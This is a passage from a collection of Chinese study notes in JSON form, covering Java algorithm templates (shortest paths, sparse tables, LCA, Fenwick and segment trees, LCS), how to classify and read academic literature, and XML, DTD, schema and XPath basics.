List<int[]>[] graph) {\n  Queue<State> queue = new LinkedList<>();\n  // 标记顶点是否正在队列中\n  boolean[] used = new boolean[n];\n  // 标记顶点进入了几次队列\n  int[] num = new int[n];\n  Arrays.fill(dist, Integer.MAX_VALUE);\n  dist[startState.id] = 0; //第s个顶点到自身距离为0\n  queue.add(startState); // 第s个顶点入队\n  num[startState.id] = 1; // 表示第s个顶点已进入了1次队列\n  used[startState.id] = true; // 表示第s个节点正在队列中\n\n  while (!queue.isEmpty()) {\n    State currentState = queue.poll();\n    used[currentState.id] = false;\n\n    List<State> nextStates = new ArrayList<>();\n    for (int[] neighbor : graph[currentState.id]) {\n      nextStates.add(new State(neighbor[0], dist[currentState.id] + neighbor[1]));\n    }\n\n    for (State nextState : nextStates) {\n      if (dist[nextState.id] > nextState.distFromStart) {\n        dist[nextState.id] = nextState.distFromStart;\n        if (!used[nextState.id]) {\n          queue.add(nextState);\n          num[nextState.id]++;\n          if (num[nextState.id] > n) {\n            return false;\n          }\n          used[nextState.id] = true;\n        }\n      }\n    }\n  }\n  return false;\n}\n\n// 辅助类, 用于优先队列\nclass State {\n    // 图节点的 id\n    int id;\n    // 从 start 节点到当前节点的距离\n    int distFromStart;\n\n    State(int id, int distFromStart) {\n        this.id = id;\n        this.distFromStart = distFromStart;\n    }\n}\n```\n\n## 搜索\n### 二分查找\n```java\n/**\n * 二分查找转折点\n * f(left) = true\n * f(right) = false\n *\n * @param left  左边界下标\n * @param right 右边界下标\n * @return 转折点\n **/\nint binarySearch(int left, int right) {\n  while (left + 1 != right) {\n    int mid = left + (right - left) / 2;\n    if (f(mid)) {\n      left = mid;\n    } else if (!f(mid)) {\n      right = mid;\n    }\n  }\n  return left;\n}\n\nboolean f(int index) {\n  // TODO\n  return false;\n}\n```\n\n## 数论\n### 高斯消元法求行列式\n```java\n/**\n * 高斯消元法求行列式。复杂度O(n^3logn)。\n * 计算|mat|\n *\n * @param mat 行列式\n * @return 行列式值\n */\nInteger det(Integer[][] mat) {\n  int n = mat.length;\n  int ret = 1;\n  for (int i = 0; i < n; i++) {\n    for (int j = i + 1; j < n; j++) {\n      while (mat[j][i] != 0) {\n        int t = mat[i][i] / mat[j][i];\n        for (int k = i; k < n; k++) {\n          mat[i][k] = ((mat[i][k] - mat[j][k] * t));\n          int s = mat[i][k];\n          mat[i][k] = mat[j][k];\n          mat[j][k] = s;\n        }\n        ret = -ret;\n      }\n    }\n    if (mat[i][i] == 0) {\n      return 0;\n    }\n    ret = ret * mat[i][i];\n  }\n  return ret;\n}\n```\n\n### 高斯消元法求行列式取模\n```java\n/**\n * 高斯消元法求行列式取模。复杂度O(n^3logn)。\n * 计算|mat| % m\n *\n * @param mat 行列式\n * @param m 模\n * @return 行列式值\n */\nint detMod(Integer[][] mat, int m) {\n  int n = mat.length;\n  for (int i = 0; i < n; i++) {\n    for (int j = 0; j < n; j++) {\n      mat[i][j] %= m;\n    }\n  }\n  long ret = 1;\n  for (int i = 0; i < n; i++) {\n    for (int j = i + 1; j < n; j++) {\n      while (mat[j][i] != 0) {\n        long t = mat[i][i] / mat[j][i];\n        for (int k = i; k < n; k++) {\n          mat[i][k] = (int) ((mat[i][k] - mat[j][k] * t) % m);\n          int s = mat[i][k];\n          mat[i][k] = mat[j][k];\n          mat[j][k] = s;\n        }\n        ret = -ret;\n      }\n    }\n    if (mat[i][i] == 0) {\n      return 0;\n    }\n    ret = ret * mat[i][i] % m;\n  }\n  if (ret < 0) {\n    ret += m;\n  }\n  return (int) ret;\n}\n```\n\n### 求最大公因数\n```java\n/**\n * 求最大公因数(greatest common divisor)\n */\nint gcd(int a, int b) {\n  // 辗转相除\n  return b ==0 ? a : gcd(b, a % b);\n}\n```\n\n### 求最小公倍数\n```java\n/**\n * 求最小公倍数(Least Common Multiple)\n */\nint lcm(int a, int b) {\n  return a * b / gcd(a, b);\n}\n```\n\n### 比较2个大数的大小\n```java\n/**\n * 比较2个大数的大小。\n *\n * @param str1 字符串表示的大数1\n * @param str2 字符串表示的大数2\n * @return 返回负数：str1小于str2；返回0：str1等于ste2；返回正数：str1大于str2\n */\nint largeNumCompare(String str1, String str2) {\n  // 首先比较字符串长度\n  int lenDiff = str1.length() - str2.length();\n  // 长度相等时比较字符串字典序大小\n  if (lenDiff == 0) return str1.compareTo(str2);\n  return lenDiff;\n}\n```\n\n## 区间信息维护与查询\n### 大小堆实现查找kth\n```java\nclass FindKthByHeap {\n  private int[] nums;\n  // 所要找的第几大的元素\n  int k;\n\n  /**\n   * 创建大根堆与小根堆。\n   * 堆存储堆是元素的id。即nums的下标\n   */\n  Comparator<Integer> comparator = (a, b) -> nums[a] != nums[b] ? Integer.compare(nums[a], nums[b]) : a - b;\n  TreeSet<Integer> maxHeap = new TreeSet<>(comparator.reversed());\n  TreeSet<Integer> minHeap = new TreeSet<>(comparator);\n\n  public FindKthByHeap(int[] nums, int k) {\n    this.nums = nums;\n    this.k = k;\n  }\n\n  /**\n   * 往堆中添加元素\n   */\n  public void add(int itemId) {\n    minHeap.add(itemId);\n    maxHeap.add(minHeap.pollFirst());\n    balance();\n  }\n\n  /**\n   * 通过给定的元素id删除堆中对应的元素\n   *\n   * @param itemId 元素的id\n   */\n  public void remove(int itemId) {\n    if (!maxHeap.remove(itemId)) {\n      minHeap.remove(itemId);\n    }\n  }\n\n  /**\n   * @return 第k大元素的id\n   */\n  public int getKthItemId() {\n    return maxHeap.first();\n  }\n\n  /**\n   * @return 第k大元素\n   */\n  public int getKthItem() {\n    return nums[maxHeap.first()];\n  }\n\n\n  /**\n   * @return 第k+1大元素的id\n   */\n  public int getK1thItemId() {\n    return minHeap.first();\n  }\n\n  /**\n   * @return 第k+1大元素\n   */\n  public int getK1thItem() {\n    return nums[minHeap.first()];\n  }\n\n  /**\n   * 维持大根堆元素个数小于等于k\n   */\n  private void balance() {\n    while (maxHeap.size() > k) {\n      minHeap.add(maxHeap.pollFirst());\n    }\n  }\n\n  }\n```\n\n### 一维ST表\n```java\nclass ST {\n  // F[i][j]: 表示[i, i+2^j-1]区间的最值\n  int[][] F;\n\n  public ST(int[] nums) {\n    int n = nums.length;\n    int k = (int) (Math.log(n) / Math.log(2));\n    // 初始化F数组\n    F = new int[n][k + 1];\n    for (int i = 0; i < n; i++) {\n      F[i][0] = nums[i];\n    }\n    for (int j = 1; j <= k; j++) {\n      for (int i = 0; i < n - (1 << j) + 1; i++) {\n        F[i][j] = Math.max(F[i][j - 1], F[i + (1 << (j - 1))][j - 1]);\n      }\n    }\n  }\n\n  // 求区间[l..r]的最值\n  int query(int l, int r) {\n    if (l > r) {\n      // TODO\n    }\n    int k = (int) (Math.log(r - l + 1) / Math.log(2));\n    return Math.max(F[l][k], F[r - (1 << k) + 1][k]);\n  }\n\n}\n```\n\n### 二维ST表\n```java\nclass ST {\n  // F[r][i][j]: 表示第r行的[i, i+2^j-1]区间的最大值\n  int F[][][];\n\n  public ST(int[][] nums) {\n    int n = nums[0].length;\n    int k = (int) (Math.log(n) / Math.log(2));\n    int row = nums.length;\n    F = new int[row][n][k + 1];\n    for (int r = 0; r < row; r++) {\n      for (int c = 0; c < n; c++) {\n        F[r][c][0] = nums[r][c];\n      }\n      for (int j = 1; j <= k; j++) {\n        for (int i = 0; i < n - (1 << j) + 1; i++) {\n          F[r][i][j] = Math.max(F[r][i][j - 1], F[r][i + (1 << (j - 1))][j - 1]);\n        }\n      }\n    }\n  }\n\n  /**\n   * @param row    矩阵左上顶点位于的行\n   * @param col    矩阵左上顶点位于的列\n   * @param width  矩阵宽度（即一行元素的个数）\n   * @param height 矩阵高度（即一列元素的个数）\n   * @return 矩阵范围内的最值\n   */\n  int query(int row, int col, int width, int height) {\n    int max = Integer.MIN_VALUE;\n    for (int r = row; r < height + row; r++) {\n      int k = (int) (Math.log(width) / Math.log(2));\n      // 右边界\n      int rightCol = col + width - 1;\n      max = Math.max(max, Math.max(F[r][col][k], F[r][rightCol - (1 << k) + 1][k]));\n    }\n    return max;\n  }\n}\n```\n\n### 最近公共祖先LCA\n#### 只需要求两个节点的LCA\n```java\nclass LCA {\n  // F[i][j]表示从i节点向上走2^j步\n  int F[][];\n  // 存储节点的深度\n  int[] dep;\n  // 使用邻接表来存储树\n  List<Integer>[] tree;\n  // 最多可以跳2^k步\n  int k;\n\n  /**\n   * @param root 树的根节点\n   */\n  public LCA(List<Integer>[] tree, Integer root) {\n    this.tree = tree;\n    int n = tree.length;\n    dep = new int[n];\n    k = (int) (Math.log(n) / Math.log(2));\n    F = new int[n][k + 1];\n    // 初始化\n    dep[root] = 1;\n    dfs(root);\n  }\n\n  /**\n   * @param v 当前节点\n   */\n  void dfs(int v) {\n    for (int i = 1; (1 << i) <= dep[v]; i++) {\n      F[v][i] = F[F[v][i - 1]][i - 1];\n    }\n    // 遍历当前当前节点的子节点\n    for (int child : tree[v]) {\n      dep[child] = dep[v] + 1;\n      F[child][0] = v;\n      dfs(child);\n    }\n  }\n\n  /**\n   * 查询x节点与y节点的最近公共祖先\n   */\n  int getLCA(int x, int y) {\n    if (dep[x] < dep[y]) {\n      int temp = x;\n      x = y;\n      y = temp;\n    }\n    for (int i = k; i >= 0; i--) {\n      if (dep[F[x][i]] >= dep[y]) {\n        x = F[x][i];\n      }\n      if (x == y) {\n        return x;\n      }\n    }\n    for (int i = k; i >= 0; i--) {\n      if (F[x][i] != F[y][i]) {\n        x = F[x][i];\n        y = F[y][i];\n      }\n    }\n    return F[x][0];\n  }\n\n}\n```\n\n#### 扩展成要求任何两点之间的距离\n```java\nclass LCA {\n  // F[i][j]表示从i节点向上走2^j步\n  int F[][];\n  // 存储节点的深度\n  int[] dep;\n  // dist[i]表示表示节点i到根节点的距离\n  int[] dist;\n  // 使用邻接表来存储树\n  List<int[]>[] tree;\n  // 最多可以跳2^k步\n  int k;\n\n  public LCA(List<int[]>[] tree, Integer root) {\n    this.tree = tree;\n    int n = tree.length;\n    dep = new int[n];\n    dist = new int[n];\n    k = (int) (Math.log(n) / Math.log(2));\n    F = new int[n][k + 1];\n    // 初始化\n    dep[root] = 1;\n    dfs(root);\n  }\n\n  /**\n   * @param v 当前节点\n   */\n  void dfs(int v) {\n    for (int i = 1; (1 << i) <= dep[v]; i++) {\n      F[v][i] = F[F[v][i - 1]][i - 1];\n    }\n    for (int[] child : tree[v]) {\n      dep[child[0]] = dep[v] + 1;\n      dist[child[0]] = dist[v] + child[1];\n      F[child[0]][0] = v;\n      dfs(child[0]);\n    }\n  }\n\n  /**\n   * 查询x节点与y节点的最近公共祖先\n   */\n  int getLCA(int x, int y) {\n    if (dep[x] < dep[y]) {\n      int temp = x;\n      x = y;\n      y = temp;\n    }\n    for (int i = k; i >= 0; i--) {\n      if (dep[F[x][i]] >= dep[y]) {\n        x = F[x][i];\n      }\n      if (x == y) {\n        return x;\n      }\n    }\n    for (int i = k; i >= 0; i--) {\n      if (F[x][i] != F[y][i]) {\n        x = F[x][i];\n        y = F[y][i];\n      }\n    }\n    return F[x][0];\n  }\n\n  /**\n   * 查询x节点与y节点的之间的距离\n   */\n  int getDist(int x, int y) {\n    int lac = getLCA(x, y);\n    return dist[x] + dist[y] - 2 * dist[lac];\n  }\n\n}\n```\n\n### 树状数组\n#### 模版\n```java\nclass BIT {\n  int[] a, c;\n\n  public BIT(int[] nums) {\n    int n = nums.length;\n    a = new int[n];\n    c = new int[n + 1];\n    for (int i = 0; i < n; i++) update(i, nums[i]);\n  }\n\n  // 更新a[i]为val\n  public void update(int i, int val) {\n    int diff = val - a[i];\n    a[i] = val;\n    for (i++; i < c.length; i += (i & -i)) {\n      c[i] += diff;\n    }\n  }\n\n  // 求a[0...i]之和\n  public int preSum(int i) {\n    int sum = 0;\n    for (i++; i > 0; i -= (i & -i)) sum += c[i];\n    return sum;\n  }\n}\n```\n\n### 线段树\n#### zkw线段树\n```java\nclass SegmentTree {\n  int n;\n  int[] st;\n\n  public SegmentTree(int[] nums) {\n    n = nums.length;\n    st = new int[2 * n];\n    for (int i = n; i < n * 2; i++) st[i] = nums[i - n];\n    for (int i = n - 1; i > 0; i--) st[i] = st[2 * i] + st[2 * i + 1];\n  }\n\n  // 将nums[i]更新为val\n  void update(int i, int val) {\n    int diff = val - st[i + n];\n    for (i += n; i > 0; i /= 2) st[i] += diff;\n  }\n\n  // 求nums[i..j]之和\n  int sumRange(int i, int j) {\n    int res = 0;\n    for (i += n, j += n; i <= j; i /= 2, j /= 2) {\n      // s[i]是右子节点\n      if (i % 2 == 1) res += st[i++];\n      // s[j]是左子节点\n      if (j % 2 == 0) res += st[j--];\n    }\n    return res;\n  }\n}\n```\n\n#### 基于tree的线段树\n```java\nclass Node {\n  int start, end, sum;\n  Node left, right;\n\n  Node(int start, int end) {\n    this.start = start;\n    this.end = end;\n  }\n}\n\nclass SegmentTree {\n  int[] nums;\n  Node root;\n\n  public SegmentTree(int[] nums) {\n    this.nums = nums;\n    this.root = buildTree(nums, 0, nums.length - 1);\n  }\n\n  private Node buildTree(int[] nums, int start, int end) {\n    if (start > end) return null;\n    Node node = new Node(start, end);\n    if (start == end) {\n      node.sum = nums[start];\n    } else {\n      int mid = start + (end - start) / 2;\n      node.left = buildTree(nums, start, mid);\n      node.right = buildTree(nums, mid + 1, end);\n      node.sum = node.left.sum + node.right.sum;\n    }\n    return node;\n  }\n\n  // 更新nums[i]为val\n  public void update(Node node, int i, int val) {\n    if (node.start == node.end) {\n      node.sum = val;\n      return;\n    }\n    int mid = node.start + (node.end - node.start) / 2;\n    if (i <= mid) update(node.left, i, val);\n    else if (i > mid) update(node.right, i, val);\n    node.sum = node.left.sum + node.right.sum;\n  }\n\n  // 求nums[start...end]之和\n  public int sumRange(Node node, int start, int end) {\n    if (start > end) return 0;\n    if (node.start == start && node.end == end) return node.sum;\n    int mid = node.start + (node.end - node.start) / 2;\n    if (end <= mid) return sumRange(node.left, start, end);\n    else if (start > mid) return sumRange(node.right, start, end);\n    else return sumRange(node.left, start, mid) + sumRange(node.right, mid + 1, end);\n  }\n\n}\n```\n\n## 双指针\n### 滑动窗口\n```java\nvoid slidingWindow(int[] nums) {\n  // 为左闭右开区间，即[left, right)\n  int left = 0, right = 0;\n\n  while (right < nums.length) {\n    //增大窗口\n    right++;\n    // TODO 根据窗口内容进行处理\n\n    // 缩小窗口\n    while (left <= right && windowNeedsShrink(left, right)) {\n      left++;\n      // TODO 根据窗口内容发生的变化进行处理\n    }\n\n  }\n}\n\n// 判断左侧窗口是否要收缩\nboolean windowNeedsShrink(int left, int right) {\n  // TODO\n  return false;\n}\n```\n\n## 动态规划\n### 最长公共子序列\n```java\n/**\n * 求s1与s2的最长公共子序列的长度\n */\npublic int lcs(String s1, String s2) {\n  int s1Length = s1.length();\n  int s2Length = s2.length();\n  int[][] dp = new int[s1Length + 1][s2Length + 1];\n  for (int i = 0; i < s1Length; i++) {\n    for (int j = 0; j < s2Length; j++) {\n      if (s1.charAt(i) == s2.charAt(j)) {\n        dp[i + 1][j + 1] = dp[i][j] + 1;\n      } else {\n        dp[i + 1][j + 1] = Math.max(dp[i][j + 1], dp[i + 1][j]);\n      }\n    }\n  }\n  return dp[s1Length][s2Length];\n}\n```\n\n# java算法小知识点\n## `List<int[]>[]`初始化\n```java\nList<int[]>[] graph = new ArrayList[n];\n\n// 错误写法\nArrays.fill(graph, new ArrayList()); // 这个语句会使得graph数组中的每个元素都指向的是同一地址\n\n// 正确写法\nfor (int i = 0; i < n; i++) {\n  graph[i] = new ArrayList();\n}\n```\n\n## `List<int[]>`转`int[][]`\n```java\nList<int[]> res = new ArrayList<>();\nres.add(new int[]{1, 2});\nres.add(new int[]{22, 56});\n\nint[][] nums = res.toArray(new int[0][0]);\n```\n\n"
  },
  {
    "title": "./notes/基础知识/文献.md",
    "body": "# 文献的分类\n**根据文献的内容分类**\n- 综述类文献 review article\n\t- 领域里面的大牛对某一领域或某一个方向 进行一种系统的阐述。如：immunology 就有 annual review of immunology。review article把这个领域进行一个全面的阐述\n\t- prospective 往往领域里面的大牛对未来，这个领域的热点和未来的发展做一个展望\n\t- 会议 一个会议往往有一个文章，把整个会议的情况給大家做一个介绍\n- 研究类文章 research article\n\t- 往往有一个标题；有摘要；有前言；有材料方法；有结果有讨论。这里面往往围绕一个科学问题，得出一个结论\n- 方法学的文章\n\t- 专门介绍一个方法，这个方法往往能推动我们这个领域的进步\n\n**根据文献的加工**\n- 一次文献\n\t- 指以作者本人的研究成果为依据而创作的原始文献，如期刊论文、研究报告、专利说明书、会议论文等。\n- 二次文献\n\t- 是对一次文献进行加工整理后产生的一类方面，如书目、题录、简介、文摘等检索工具。\n- 三次文献\n\t- 是在一、二次文献的基础上，经过综合分析而编写出来的文献，人们常把这类文献称为“情报研究”的成果，如综述、专题述评、学科年度总结、进展报告、数据手册等\n\n\n\nTips:开展新的课题需要先开始阅读综述的文章\n第一部分 综述类文章的阅读\n首先找到自己的大的领域\n第一步：找到森林\n如：“肿瘤”\n肿瘤怎么来的？肿瘤的发生发展？从细胞基因突变-细胞发生变异，变成一中癌细胞\n肿瘤免疫就是免疫系统怎么和肿瘤战争\n已经行成肿瘤\n对药物怎么行成耐药：肿瘤的耐药\n最后 对肿瘤治疗过程中有没有其他的手段\n第二步：找到不同的树\n如：肿瘤微环境里面\n肿瘤微环境有哪几个部分组成\n有肿瘤细胞 有免疫细胞 还有一些分子\n肿瘤细胞产生的分子 免疫细胞产生的分子 基质蛋白产生的分子 这些细胞与细胞之间相互作用 分子与分子之间的相互作用 这样构成一个肿瘤微环境\n“假定”聚焦肿瘤微环境的免疫细胞 \nb细胞 T细胞（细胞亚群）\n第三步：找到树上的结构\n大领域里面有哪几个方向\n方向里面有哪几个问题\n问题里面你的关键问题是哪一个方向\n理清关系\nTips : 自己写综述的过程很棒！\nTips ：不要局限于1-2篇综述文章\n看不懂怎么办\n读一篇文献之前，不认识的专业上的名词先画出来 找字典 标注在旁边\n边看文献边做记录"
  },
  {
    "title": "./notes/基础知识/xml.md",
    "body": "# xml简介\n概念：Extensible Markup Language 可扩展标记语言\n可扩展：标签都是自定义的。 `<user>`,`<student>`\n语法：\n- xml文档的后缀名 .xml\n- xml第一行必须定义为文档声明\n- xml文档中有且仅有一个根标签\n- 属性值必须使用引号(单双都可)引起来\n- 标签必须正确关闭\n- xml标签名称区分大小写\n\n## 文档声明\nxml第一行必须定义为文档声明 `<?xml 属性列表?>`。 第一行空着，将文档声明写在第二行都不行，且<与?之间不能有空格\n**属性列表**\nversion: 版本号，必要的属性\n\n## CDATA区\n：在该区域中的数据会被原样展示\n格式： `<![CDATA[ 数据 ]]>`\n\n## 约束\n在xml技术里，**编写一个文档/文件**来约束一个xml文档的书写规范、称为xml约束。因为没有约束 编写的xml文件格式就不统一\n常用的xml约束技术有如下两种\n- dtd：一种简单的约束条件，文件后缀为dtd\n- schema ：一种复杂的约束条件，文件后缀为xsd\n\n### dtd\n```dtd\n<!ELEMENT students (student*) >   //声明了标签students，该标签下能有子标签student, 且该子标签可以有多个\n<!ELEMENT student (name,age,sex)> //声明了标签student, 该标签下能有子标签name,age,sex,且每个子标签只能出现一次， 且必须按照name->age->sex顺序出现\n<!ELEMENT name (#PCDATA)> //声明了标签name, 且该标签体内为字符串\n<!ELEMENT age (#PCDATA)>\n<!ELEMENT sex (#PCDATA)>\n<!ATTLIST student number ID #REQUIRED> //给标签student声明了属性number, 该属性的类型为ID，且该属性是必须的\n```\ndtd分为外部dtd与内部dtd\n**内部dtd**\n将约束规则定义在xml文档中，格式`<!DOCTYPE 根标签名 [dtd文件内容]>`\n**外部dtd**\n将约束的规则定义在外部的dtd文件中\n- 本地：`<!DOCTYPE 根标签名 SYSTEM \"dtd文件的位置\">`\n- 网络：`<!DOCTYPE 根标签名 PUBLIC \"dtd文件名字\" \"dtd文件的位置URL\">`\n\n使用例子：\n引用上面的dtd文件\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<!DOCTYPE students SYSTEM \"student.dtd\">\n<students>\n\t<student number=\"002\">\n\t\t<name>张三</name>\n\t\t<age>18</age>\n\t\t<sex>male</sex>\n\t</student>\n\t<student number=\"001\">\n\t\t<name>jack</name>\n\t\t<age>18</age>\n\t\t<sex>female</sex>\n\t</student>\n</students>\n```\n\n### schema\n```xml\n<?xml version=\"1.0\"?>\n<xsd:schema xmlns=\"http://www.itcast.cn/xml\"\n        xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\n        targetNamespace=\"http://www.itcast.cn/xml\" elementFormDefault=\"qualified\">\n\t<!-- 定义了标签students, 该标签类型为studentsType -->\n    <xsd:element name=\"students\" type=\"studentsType\"/>\n\n\t<!-- 声明studentsType类型 -->\n    <xsd:complexType name=\"studentsType\">\n\t\t<!-- 表示下面标签按如下顺序出现 -->\n        <xsd:sequence>\n\t\t\t<!-- student标签类型为studentType, 该标签最少出现0次，最多出现的次数无上限 -->\n            <xsd:element name=\"student\" type=\"studentType\" minOccurs=\"0\" maxOccurs=\"unbounded\"/>\n        </xsd:sequence>\n    </xsd:complexType>\n\n    <xsd:complexType name=\"studentType\">\n\t\t<!-- 表示下面标签按如下顺序出现 -->\n        <xsd:sequence>\n            <xsd:element name=\"name\" type=\"xsd:string\"/>\n            <xsd:element name=\"age\" type=\"ageType\" />\n            <xsd:element name=\"sex\" type=\"sexType\" />\n        </xsd:sequence>\n\t\t<!-- 声明了属性number -->\n        <xsd:attribute name=\"number\" type=\"numberType\" use=\"required\"/>\n    </xsd:complexType>\n\n    <xsd:simpleType name=\"sexType\">\n        <xsd:restriction base=\"xsd:string\">\n            <xsd:enumeration value=\"male\"/>\n            <xsd:enumeration value=\"female\"/>\n        </xsd:restriction>\n    </xsd:simpleType>\n\n    <xsd:simpleType name=\"ageType\">\n        <xsd:restriction base=\"xsd:integer\">\n            <xsd:minInclusive value=\"0\"/>\n            <xsd:maxInclusive value=\"256\"/>\n        </xsd:restriction>\n    </xsd:simpleType>\n\n    <xsd:simpleType name=\"numberType\">\n        <xsd:restriction base=\"xsd:string\">\n            <xsd:pattern value=\"heima_\\d{4}\"/>\n        </xsd:restriction>\n    </xsd:simpleType>\n</xsd:schema> \n```\n引入：\n1.填写xml文档的根元素\n2.引入xsi前缀,  `xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"`\n3.通过xsi引入xsd文件，并给其xsd命名为`http://www.itcast.cn/xml`, 这个称为**命名空间**。语法为： `xsi:schemaLocation=\"http://www.itcast.cn/xml  student.xsd\"`\n4.为命名空间声明一个前缀, 作为标识，例如： `xmlns:a=\"http://www.itcast.cn/xml\"` 此时`<a: table>..</table>`表示的就是使用student.xsd约束的标签； \n注`xmlns=\"http://www.itcast.cn/xml\"`表示给`http://www.itcast.cn/xml`声明了一个默认的命名空间，此时`<table>..</table>`不加前缀，就表示的是使用student.xsd约束的标签\n\n以下是springmvc的配置文件\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:context=\"http://www.springframework.org/schema/context\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" \n\t   xmlns:mvc=\"http://www.springframework.org/schema/mvc\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n                           http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\n\t\t\t\t\t\t   http://www.springframework.org/schema/mvc https://www.springframework.org/schema/mvc/spring-mvc.xsd\">\n\n    <context:component-scan base-package=\"com.ssm.crud\" use-default-filters=\"false\">\n        <context:include-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\"/>\n    </context:component-scan>\n\n    <bean id=\"viewResolver\" class=\"org.springframework.web.servlet.view.InternalResourceViewResolver\">\n        <property name=\"prefix\" value=\"/WEB-INF/views\"></property>\n    </bean>\n\n    <mvc:default-servlet-handler/>\n\n    <mvc:annotation-driven/>\n</beans>\n```\n\n## xml中的特殊字符的表示\n在xml文件中&为特殊字符，需要用转义字符`\\&amp`;来表示&\n所以在xml文件配置数据库的url时使用\n\n```xml\n<property name=\"url\" value=\"jdbc:mysql://localhost:3306/ssm_crud?serverTimezone=GMT&amp;useSSL=false\"></property>\n```\n\n但采用.properties时，由于&在.properties中不是特殊字符，所以可以直接写\n\n```properties\njdbc.url=jdbc:mysql://localhost:3306/ssm_crudserverTimezone=GMT&useSSL=false\n```\n\n# XPATH\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409131256.png)\n\nXPath (XML Path Language) 是一门在 XML 文档中查找信息的语言，可用来在 XML 文档中对元素和属性进行遍历。\nW3School官方文档：http://www.w3school.com.cn/xpath/index.asp\n\nXPath 开发工具\n1. 开源的XPath表达式编辑工具:XMLQuire(XML格式文件可用)\n2. Chrome插件 XPath Helper\n3. Firefox插件 try XPath \n\n## 选取节点\nXPath 使用路径表达式来选取 XML 文档中的节点或者节点集。这些路径表达式和我们在常规的电脑文件系统中看到的表达式非常相似。\n下面列出了最常用的路径表达式：\n| 表达式   | 描述                                                               |\n| -------- | ------------------------------------------------------------------ |\n| nodename | 选取此节点的所有子节点。                                           |\n| /        | 如果是在最前面，代表从根节点选取。否则选择某节点下的某个直接子节点 |\n| //       | 从全局节点中选择节点，随意在哪个位置                               |\n| .        | 选取当前节点。                                                     |\n| ..       | 选取当前节点的父节点。                                             |\n| @        | 选取含有指定属性的元素。                                           |\n\n在下面的表格中，我们已列出了一些路径表达式以及表达式的结果：\n\n| 路径表达式      | 结果                                                                                                     |\n| --------------- | -------------------------------------------------------------------------------------------------------- |\n| bookstore       | 选取 bookstore 元素的所有子节点。                                                                        |\n| /bookstore      | 选取根元素下的直接子元素bookstore。注释：假如路径起始于正斜杠( / )，则此路径始终代表到某元素的绝对路径！ |\n| bookstore/book  | 选取属于 bookstore 的直接子元素的所有 book 元素。                                                        |\n| //book          | 选取所有 book 子元素，而不管它们在文档中的位置。                                                         |\n| bookstore//book | 选择属于 bookstore 元素的后代的所有 book 元素，而不管它们位于 bookstore 之下的什么位置。                 |\n| //@lang         | 选取有lang属性的元素的Lang属性值。                                                                       |\n\n## 谓语（Predicates）\n谓语用来查找某个特定的节点或者包含某个指定的值的节点，被嵌在方括号中。\n在下面的表格中，我们列出了带有谓语的一些路径表达式，以及表达式的结果：\n| 路径表达式                                    | 结果|\n| --------------------------------------------- | -------------------------------------------|\n| `/bookstore/book[1]`                          | 选取属于 bookstore 子元素的第一个 book 元素。                                             |\n| `/bookstore/book[last()]`                     | 选取属于 bookstore 子元素的最后一个 book 元素。                                           |\n| `/bookstore/book[last()-1]`                   | 选取属于 bookstore 子元素的倒数第二个 book 元素。                                         |\n| `/bookstore/book[position()<3]`               | 选取最前面的两个属于 bookstore 元素的子元素的 book 元素。                                 |\n| `//title[@lang]`                              | 选取所有拥有名为 lang 的属性的 title 元素。                                               |\n| `//title[@lang=’eng’]`                        | 选取所有 title 元素，且这些元素拥有值为 eng 的 lang 属性。                                |\n| `/bookstore/book[price>35.00]`                | 选取 bookstore 元素的所有 book 元素，且其中的 price 元素的值须大于 35.00。                |\n| `/bookstore/book[price>35.00]/title`          | 选取 bookstore 元素中的 book 元素的所有 title 元素，且其中的 price 元素的值须大于 35.00。 |\n| `/bookstore/book[contains(@class,\"fdfd\")/ul]` | 选取bookstore元素中的class属性中含有fdfd值的book元素的子元素ul                            |\n\n## 选取未知节点\nXPath 通配符可用来选取未知的 XML 元素。\n| 通配符 | 描述                 |\n| ------ | -------------------- |\n| `*`      | 匹配任何元素节点。   |\n| `@*`     | 匹配任何属性节点。   |\n| node() | 匹配任何类型的节点。 |\n\n在下面的表格中，我们列出了一些路径表达式，以及这些表达式的结果：\n| 路径表达式    | 结果                              |\n| ------------- | --------------------------------- |\n| `/bookstore/*`  | 选取 bookstore 元素的所有子元素。 |\n| `//*`           | 选取文档中的所有元素。            |\n| `//title[@*]` | 选取所有带有属性的 title 元素。   |\n\n## 选取若干路径\n通过在路径表达式中使用“|”运算符，您可以选取若干个路径。\n实例\n在下面的表格中，我们列出了一些路径表达式，以及这些表达式的结果：\n| 路径表达式                       | 结果                                                                                |\n| -------------------------------- | ----------------------------------------------------------------------------------- |\n| //book/title \\| //book/price     | 选取 book 元素的所有 title 和 price 元素。                                          |\n| //title \\| //price               | 选取文档中的所有 title 和 price 元素。                                              |\n| /bookstore/book/title \\| //price | 选取属于 bookstore 元素的 book 元素的所有 title 元素，以及文档中所有的 price 元素。 |\n\n## XPath的运算符\n下面列出了可用在 XPath 表达式中的运算符：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409131304.png)\n"
  },
  {
    "title": "./notes/基础知识/计算机网络.md",
